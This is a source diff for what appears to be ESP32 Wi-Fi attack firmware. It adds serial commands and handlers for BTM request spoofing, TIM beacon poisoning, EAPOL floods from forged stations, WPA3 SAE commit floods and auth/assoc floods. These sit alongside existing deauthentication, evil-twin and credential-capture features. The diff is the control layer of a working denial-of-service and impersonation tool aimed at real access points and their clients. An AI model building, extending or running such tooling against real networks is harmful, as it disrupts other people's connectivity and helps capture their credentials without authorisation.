@@ -9,9 +9,15 @@
 #include <stdlib.h>
 #include <string.h>
 
+#include "authflood.h"
 #include "csa.h"
 #include "deauth.h"
 #include "delba.h"
+#include "eapol.h"
+#include "sae.h"
+#include "tim.h"
+#include "tx_guard.h"
+#include "wnm.h"
 
 // Auto CSA: per-round impersonation window on the announced channel.
 #define CSA_AUTO_HOLD_MS 500
@@ -67,9 +73,9 @@ const char* attack_mode_label() {
 
 const char* capabilities() {
 #if CONFIG_SOC_WIFI_SUPPORT_5G
-  return "deauth,eviltwin,probe,5g";
+  return "deauth,eviltwin,probe,5g,wnm,tim,eapol,sae,authflood";
 #else
-  return "deauth,eviltwin,probe";
+  return "deauth,eviltwin,probe,wnm,tim,eapol,sae,authflood";
 #endif
 }
 
@@ -101,7 +107,7 @@ void print_help() {
   Serial.println("INFO EVILTWIN <idx> / EVILTWIN_STOP / CREDS");
   Serial.println("INFO TOUCH / CALIBRATE             LVGL touch readback / recalibrate");
   Serial.println("INFO UITARGETS / UI                LVGL target popup: open / report state");
-  Serial.println("INFO UISCREEN <name>               switch the LVGL screen (menu/deauth/mode/probe/csa/delba/evil)");
+  Serial.println("INFO UISCREEN <name>               switch the LVGL screen (menu/deauth/mode/probe/csa/delba/ba/evil/wnm/tim/eapol/sae/authflood)");
   Serial.println("INFO RXMIX                         received frame mix (beacon/probe/deauth/ctrl/data)");
   Serial.println("INFO REASON [1-65535|random]       deauth reason code: fixed, random per burst, or report");
   Serial.println("INFO CSA <idx> [ch] [cnt] [secs]   CSA spoof; no ch/auto = random opposite-band channel, loops");
@@ -116,6 +122,21 @@ void print_help() {
   Serial.println("INFO BATX                          send one DELBA/ADDBA/BAR and print the driver verdict");
   Serial.println("INFO BAPLANT <idx> [step]          plant the reorder window once, then stay silent (window-hijack test)");
   Serial.println("INFO BARPUSH <idx> [step]          send only BARs (no ADDBA/DELBA), then stay silent");
+  Serial.println("INFO WNM <idx> [cand|bare] [timer] [ch] [sta-mac]  802.11v BTM Request spoof (needs PMF off)");
+  Serial.println("INFO WNMSTOP                       stop the BTM Request spoof");
+  Serial.println("INFO WNMTEST                       dump the BTM Request bytes (format check)");
+  Serial.println("INFO TIM <idx> [tim|clear] [aid]   tamper the TIM element of a cloned beacon");
+  Serial.println("INFO TIMSTOP                       stop the beacon clone");
+  Serial.println("INFO TIMTEST                       dump the cloned beacon (TIM check)");
+  Serial.println("INFO EAPOL <idx> [tid|-1] [sta-mac] EAPOL-Start/Logoff flood as a forged station");
+  Serial.println("INFO EAPOLSTOP                     stop the EAPOL flood");
+  Serial.println("INFO EAPOLTEST                     dump the EAPOL data frames (format check)");
+  Serial.println("INFO SAE <idx> [point|rand] [gap_ms]  SAE Commit flood (WPA3), echoes anti-clogging token");
+  Serial.println("INFO SAESTOP                       stop the SAE flood");
+  Serial.println("INFO SAETEST                       dump the SAE Commit bytes (format check)");
+  Serial.println("INFO AUTHFLOOD <idx> [both|auth|assoc] [noauto]  auth/assoc flood, upgrades to SAE on WPA3");
+  Serial.println("INFO AUTHFLOODSTOP                 stop the auth/assoc flood");
+  Serial.println("INFO AUTHFLOODTEST                 dump the forged auth/assoc bytes");
   Serial.println("INFO RESTART                       esp_restart() (recovery from an exhausted TX pool)");
   Serial.println("INFO MON <ch> <secs>               passive capture on one channel (ch=0 hops 1..13)");
   Serial.println("INFO RADIO                         dump the driver's sniffer state (promisc + both filters + channel)");
@@ -132,6 +153,24 @@ int parse_index(char* token) {
   const long value = strtol(token, &end, 10);
   if (end == token) return -1;
   return (int)value;
+}
+
+// "AABBCCDDEEFF", "AA:BB:CC:DD:EE:FF" or "AA-BB-CC-DD-EE-FF" -> 6 bytes.
+bool parse_mac(const char* token, uint8_t out[6]) {
+  if (token == nullptr) return false;
+  char clean[13];
+  int n = 0;
+  for (const char* p = token; *p != '\0' && n < 13; p++) {
+    if (*p == ':' || *p == '-' || *p == '.') continue;
+    if (!isxdigit((unsigned char)*p)) return false;
+    clean[n++] = *p;
+  }
+  if (n != 12) return false;
+  for (int i = 0; i < 6; i++) {
+    const char byte[3] = {clean[i * 2], clean[i * 2 + 1], 0};
+    out[i] = (uint8_t)strtoul(byte, nullptr, 16);
+  }
+  return true;
 }
 
 enum reason_kind_t { REASON_FIXED = 0, REASON_RANDOM, REASON_BAD };
@@ -302,6 +341,12 @@ void do_status() {
   Serial.print(attack_tx_last_err());
   Serial.print(" txdrop=");
   Serial.print((unsigned)attack_tx_dropped());
+  Serial.print(" txg=");
+  Serial.print((unsigned)tx_guard_throttled());
+  Serial.print(" txgok=");
+  Serial.print((unsigned)tx_guard_ok());
+  Serial.print(" txgerr=");
+  Serial.print((unsigned)tx_guard_err());
   Serial.print(" blind=");
   Serial.print((unsigned)attack_blind_frames());
   Serial.print(" rev=");
@@ -322,6 +367,66 @@ void do_status() {
   Serial.print((unsigned)csa_auth_replies());
   Serial.print(" csarej=");
   Serial.print((unsigned)csa_assoc_rejects());
+  Serial.print(" wnm=");
+  Serial.print(wnm_mode_name());
+  Serial.print(" wnmf=");
+  Serial.print((unsigned)wnm_frames());
+  Serial.print(" wnmc=");
+  Serial.print((unsigned)wnm_capable_clients());
+  Serial.print(" wnmskip=");
+  Serial.print((unsigned)wnm_skipped_clients());
+  Serial.print(" wnmresp=");
+  Serial.print((unsigned)wnm_responses());
+  Serial.print(" wnms=");
+  Serial.print((unsigned)wnm_last_status());
+  Serial.print(" tim=");
+  Serial.print(tim_mode_name());
+  Serial.print(" timf=");
+  Serial.print((unsigned)tim_frames());
+  Serial.print(" timaid=");
+  Serial.print((unsigned)tim_aid_mask());
+  Serial.print(" timreal=");
+  Serial.print((unsigned)tim_real_beacons());
+  Serial.print(" eap=");
+  Serial.print(eapol_active() ? "on" : "off");
+  Serial.print(" eapf=");
+  Serial.print((unsigned)eapol_frames());
+  Serial.print(" eaprx=");
+  Serial.print((unsigned)eapol_rx_from_ap());
+  Serial.print(" eaprxreq=");
+  Serial.print((unsigned)eapol_rx_eap_packets());
+  Serial.print(" eaprxsta=");
+  Serial.print((unsigned)eapol_rx_from_sta());
+  Serial.print(" sae=");
+  Serial.print(sae_active() ? "on" : "off");
+  Serial.print(" saesec=");
+  Serial.print(sae_security_name(sae_security()));
+  Serial.print(" saef=");
+  Serial.print((unsigned)sae_frames());
+  Serial.print(" saec=");
+  Serial.print((unsigned)sae_identities());
+  Serial.print(" saeresp=");
+  Serial.print((unsigned)sae_responses());
+  Serial.print(" saecode=");
+  Serial.print((unsigned)sae_last_status());
+  Serial.print(" saetok=");
+  Serial.print((unsigned)sae_tokens());
+  Serial.print(" saeecho=");
+  Serial.print((unsigned)sae_echoed());
+  Serial.print(" af=");
+  Serial.print(authflood_active() ? "on" : "off");
+  Serial.print(" aff=");
+  Serial.print((unsigned)authflood_frames());
+  Serial.print(" afa=");
+  Serial.print((unsigned)authflood_auth_frames());
+  Serial.print(" afs=");
+  Serial.print((unsigned)authflood_assoc_frames());
+  Serial.print(" afids=");
+  Serial.print((unsigned)authflood_identities());
+  Serial.print(" afst=");
+  Serial.print((unsigned)authflood_last_status());
+  Serial.print(" afup=");
+  Serial.print(authflood_upgraded() ? 1 : 0);
   Serial.print(" delba=");
   Serial.print(delba_active() ? "on" : "off");
   Serial.print(" delbaf=");
@@ -683,6 +788,219 @@ void do_ba_tx() {
   delba_ba_tx_probe(probe_mac);
 }
 
+// ---- 802.11v BTM Request ----
+void do_wnm(int index, char* mode_token, char* timer_token, char* ch_token, char* mac_token) {
+  if (index < 0 || index >= g_scan_count) {
+    Serial.println("ERR index out of range, run SCAN first");
+    return;
+  }
+  wnm_mode_t mode = WNM_MODE_CAND;
+  if (token_iequals(mode_token, "bare")) {
+    mode = WNM_MODE_BARE;
+  } else if (mode_token != nullptr && !token_iequals(mode_token, "cand")) {
+    Serial.println("ERR mode must be 'cand' (candidate list) or 'bare'");
+    return;
+  }
+  const long timer = timer_token ? strtol(timer_token, nullptr, 10) : 10;
+  if (timer < 1 || timer > 65535) {
+    Serial.println("ERR timer must be 1..65535 TBTT (0 disables the client's scan)");
+    return;
+  }
+  const long ch = ch_token ? strtol(ch_token, nullptr, 10) : 0;
+  if (ch < 0 || ch > 196) {
+    Serial.println("ERR candidate channel must be 0..196 (0 = pick one)");
+    return;
+  }
+  attack_stop();
+  if (!wnm_start(index, mode, (uint16_t)timer, (uint8_t)ch)) {
+    Serial.println("ERR cannot start the BTM spoof on that network");
+    return;
+  }
+  if (mac_token != nullptr) {
+    uint8_t sta[6];
+    if (!parse_mac(mac_token, sta)) {
+      wnm_stop();
+      Serial.println("ERR station MAC must look like AABBCCDDEEFF");
+      return;
+    }
+    wnm_add_station(sta);
+    Serial.printf("OK WNMSTA %02X:%02X:%02X:%02X:%02X:%02X\n", sta[0], sta[1], sta[2], sta[3],
+                  sta[4], sta[5]);
+  }
+  Serial.printf("OK WNM %d mode=%s timer=%u cand_ch=%u ssid=%s\n", index, wnm_mode_name(),
+                (unsigned)timer, (unsigned)wnm_candidate_channel(), WiFi.SSID(index).c_str());
+  ui_log("wnm started");
+}
+
+void do_wnm_stop() {
+  const uint32_t frames = wnm_frames();
+  const uint32_t responses = wnm_responses();
+  wnm_stop();
+  Serial.printf("OK WNMSTOP frames=%u responses=%u last_status=%u\n", (unsigned)frames,
+                (unsigned)responses, (unsigned)wnm_last_status());
+  ui_log("wnm stopped");
+}
+
+// ---- TIM poisoning ----
+void do_tim(int index, char* mode_token, char* aid_token) {
+  if (index < 0 || index >= g_scan_count) {
+    Serial.println("ERR index out of range, run SCAN first");
+    return;
+  }
+  tim_mode_t mode = TIM_SET;
+  if (token_iequals(mode_token, "clear")) {
+    mode = TIM_CLEAR;
+  } else if (mode_token != nullptr && !token_iequals(mode_token, "tim")) {
+    Serial.println("ERR mode must be tim|clear");
+    return;
+  }
+  const long aid = aid_token ? strtol(aid_token, nullptr, 10) : 0;
+  if (aid < 0 || aid > 255) {
+    Serial.println("ERR aid must be 0..255 (0 = every learned AID)");
+    return;
+  }
+  attack_stop();
+  if (!tim_start(index, mode, (uint16_t)aid)) {
+    Serial.println("ERR cannot start the beacon clone on that network");
+    return;
+  }
+  Serial.printf("OK TIM %d mode=%s aid=%ld ch=%u\n", index, tim_mode_name(), aid,
+                (unsigned)WiFi.channel(index));
+  ui_log("tim clone started");
+}
+
+void do_tim_stop() {
+  const uint32_t frames = tim_frames();
+  const uint32_t real = tim_real_beacons();
+  tim_stop();
+  Serial.printf("OK TIMSTOP frames=%u real_beacons=%u\n", (unsigned)frames, (unsigned)real);
+  ui_log("tim clone stopped");
+}
+
+// ---- EAPOL ----
+void do_eapol(int index, char* tid_token, char* mac_token) {
+  if (index < 0 || index >= g_scan_count) {
+    Serial.println("ERR index out of range, run SCAN first");
+    return;
+  }
+  const long tid = tid_token ? strtol(tid_token, nullptr, 10) : 6;
+  if (tid < -1 || tid > 7) {
+    Serial.println("ERR tid must be -1 (plain data only) or 0..7");
+    return;
+  }
+  uint8_t sta[6];
+  const bool have_sta = mac_token != nullptr && parse_mac(mac_token, sta);
+  if (mac_token != nullptr && !have_sta) {
+    Serial.println("ERR station MAC must look like AABBCCDDEEFF");
+    return;
+  }
+  attack_stop();
+  if (!eapol_start(index, (int8_t)tid)) {
+    Serial.println("ERR cannot start the EAPOL flood on that network");
+    return;
+  }
+  if (have_sta) {
+    eapol_add_station(sta);
+  }
+  Serial.printf("OK EAPOL %d tid=%ld ch=%u ssid=%s\n", index, tid, (unsigned)WiFi.channel(index),
+                WiFi.SSID(index).c_str());
+  ui_log("eapol flood started");
+}
+
+void do_eapol_stop() {
+  const uint32_t frames = eapol_frames();
+  const uint32_t rx = eapol_rx_from_ap();
+  const uint32_t rxsta = eapol_rx_from_sta();
+  eapol_stop();
+  Serial.printf("OK EAPOLSTOP frames=%u rx_ap=%u rx_sta=%u eap=%u\n", (unsigned)frames,
+                (unsigned)rx, (unsigned)rxsta, (unsigned)eapol_rx_eap_packets());
+  ui_log("eapol stopped");
+}
+
+// ---- SAE commit flood ----
+void do_sae(int index, char* elem_token, char* gap_token) {
+  if (index < 0 || index >= g_scan_count) {
+    Serial.println("ERR index out of range, run SCAN first");
+    return;
+  }
+  sae_element_t element = SAE_ELEM_BASEPOINT;
+  if (token_iequals(elem_token, "rand") || token_iequals(elem_token, "random")) {
+    element = SAE_ELEM_RANDOM;
+  } else if (elem_token != nullptr && !token_iequals(elem_token, "point")) {
+    Serial.println("ERR element must be 'point' (P-256 generator) or 'rand'");
+    return;
+  }
+  const long gap = gap_token ? strtol(gap_token, nullptr, 10) : 0;
+  if (gap < 0 || gap > 1000) {
+    Serial.println("ERR gap_ms must be 0..1000");
+    return;
+  }
+  attack_stop();
+  if (!sae_start(index, element, (uint32_t)gap)) {
+    Serial.println("ERR cannot start the SAE flood on that network");
+    return;
+  }
+  if (gap > 0 && gap < 50) {
+    // The pool drains at ~32 frames/s; faster than 20 frames/s fills it in a
+    // couple of seconds and the chip restarts (0x101 rule).
+    Serial.printf("INFO SAE gap_ms=%ld raised to %u (unicast pool drains at ~32 frames/s)\n",
+                  gap, (unsigned)sae_gap_ms());
+  }
+  Serial.printf("OK SAE %d elem=%s gap_ms=%u ch=%u\n", index,
+                element == SAE_ELEM_BASEPOINT ? "point" : "rand",
+                (unsigned)sae_gap_ms(), (unsigned)WiFi.channel(index));
+  ui_log("sae flood started");
+}
+
+void do_sae_stop() {
+  const uint32_t frames = sae_frames();
+  const uint32_t resp = sae_responses();
+  const uint32_t tokens = sae_tokens();
+  sae_stop();
+  Serial.printf("OK SAESTOP frames=%u identities=%u responses=%u tokens=%u echoed=%u\n",
+                (unsigned)frames, (unsigned)sae_identities(), (unsigned)resp,
+                (unsigned)tokens, (unsigned)sae_echoed());
+  ui_log("sae stopped");
+}
+
+// ---- auth / assoc flood ----
+void do_authflood(int index, char* mode_token, char* auto_token) {
+  if (index < 0 || index >= g_scan_count) {
+    Serial.println("ERR index out of range, run SCAN first");
+    return;
+  }
+  authflood_mode_t mode = AUTHFLOOD_BOTH;
+  if (token_iequals(mode_token, "auth")) {
+    mode = AUTHFLOOD_AUTH_ONLY;
+  } else if (token_iequals(mode_token, "assoc")) {
+    mode = AUTHFLOOD_ASSOC_ONLY;
+  } else if (mode_token != nullptr && !token_iequals(mode_token, "both")) {
+    Serial.println("ERR mode must be both|auth|assoc");
+    return;
+  }
+  const bool auto_upgrade = !token_iequals(auto_token, "noauto");
+  attack_stop();
+  if (!authflood_start(index, mode, auto_upgrade)) {
+    Serial.println("ERR cannot start the auth flood on that network");
+    return;
+  }
+  Serial.printf("OK AUTHFLOOD %d mode=%s auto=%d ch=%u ssid=%s\n", index,
+                authflood_mode_name(), auto_upgrade ? 1 : 0, (unsigned)WiFi.channel(index),
+                WiFi.SSID(index).c_str());
+  ui_log("auth flood started");
+}
+
+void do_authflood_stop() {
+  const uint32_t frames = authflood_frames();
+  const uint32_t status = authflood_last_status();
+  const bool upgraded = authflood_upgraded();
+  authflood_stop();
+  Serial.printf("OK AUTHFLOODSTOP frames=%u identities=%u last_status=%u upgraded=%d\n",
+                (unsigned)frames, (unsigned)authflood_identities(), (unsigned)status,
+                upgraded ? 1 : 0);
+  ui_log("auth flood stopped");
+}
+
 void do_deauth_all(uint16_t reason) {
   if (g_scan_count == 0) {
     Serial.println("ERR no AP list, run SCAN first");
@@ -1016,11 +1334,11 @@ void do_ui_state() {
 void do_ui_screen(char* token) {
 #if CONFIG_WIRELESS_ATTACK_LVGL_SUPPORT
   if (token == nullptr) {
-    Serial.println("ERR usage: UISCREEN <menu|deauth|mode|probe|csa|delba|evil>");
+    Serial.println("ERR usage: UISCREEN <menu|deauth|mode|probe|csa|delba|ba|evil|wnm|tim|eapol|sae|authflood>");
     return;
   }
   if (!wireless_ui_show_by_name(token)) {
-    Serial.println("ERR unknown screen, try: menu deauth mode probe csa delba evil");
+    Serial.println("ERR unknown screen, try: menu deauth mode probe csa delba ba evil wnm tim eapol sae authflood");
     return;
   }
   Serial.print("OK UISCREEN ");
@@ -1143,6 +1461,53 @@ void dispatch(char* line) {
     } else {
       do_ba_plant(plant_idx, step_token ? strtol(step_token, nullptr, 10) : 512);
     }
+  } else if (strcmp(command, "WNM") == 0) {
+    char* idx_token = strtok(nullptr, " \t");
+    char* mode_token = strtok(nullptr, " \t");
+    char* timer_token = strtok(nullptr, " \t");
+    char* ch_token = strtok(nullptr, " \t");
+    char* mac_token = strtok(nullptr, " \t");
+    do_wnm(parse_index(idx_token), mode_token, timer_token, ch_token, mac_token);
+  } else if (strcmp(command, "WNMSTOP") == 0) {
+    do_wnm_stop();
+  } else if (strcmp(command, "WNMTEST") == 0) {
+    wnm_selftest();
+  } else if (strcmp(command, "TIM") == 0) {
+    char* idx_token = strtok(nullptr, " 	");
+    char* mode_token = strtok(nullptr, " 	");
+    char* aid_token = strtok(nullptr, " 	");
+    do_tim(parse_index(idx_token), mode_token, aid_token);
+  } else if (strcmp(command, "TIMSTOP") == 0) {
+    do_tim_stop();
+  } else if (strcmp(command, "TIMTEST") == 0) {
+    tim_selftest();
+  } else if (strcmp(command, "EAPOL") == 0) {
+    char* idx_token = strtok(nullptr, " \t");
+    char* tid_token = strtok(nullptr, " \t");
+    char* mac_token = strtok(nullptr, " \t");
+    do_eapol(parse_index(idx_token), tid_token, mac_token);
+  } else if (strcmp(command, "EAPOLSTOP") == 0) {
+    do_eapol_stop();
+  } else if (strcmp(command, "EAPOLTEST") == 0) {
+    eapol_selftest();
+  } else if (strcmp(command, "SAE") == 0) {
+    char* idx_token = strtok(nullptr, " \t");
+    char* elem_token = strtok(nullptr, " \t");
+    char* gap_token = strtok(nullptr, " \t");
+    do_sae(parse_index(idx_token), elem_token, gap_token);
+  } else if (strcmp(command, "SAESTOP") == 0) {
+    do_sae_stop();
+  } else if (strcmp(command, "SAETEST") == 0) {
+    sae_selftest();
+  } else if (strcmp(command, "AUTHFLOOD") == 0) {
+    char* idx_token = strtok(nullptr, " \t");
+    char* mode_token = strtok(nullptr, " \t");
+    char* auto_token = strtok(nullptr, " \t");
+    do_authflood(parse_index(idx_token), mode_token, auto_token);
+  } else if (strcmp(command, "AUTHFLOODSTOP") == 0) {
+    do_authflood_stop();
+  } else if (strcmp(command, "AUTHFLOODTEST") == 0) {
+    authflood_selftest();
   } else if (strcmp(command, "CTRLFILTER") == 0) {
     do_ctrl_filter(strtok(nullptr, " 	"));
   } else if (strcmp(command, "CTRLTEST") == 0) {
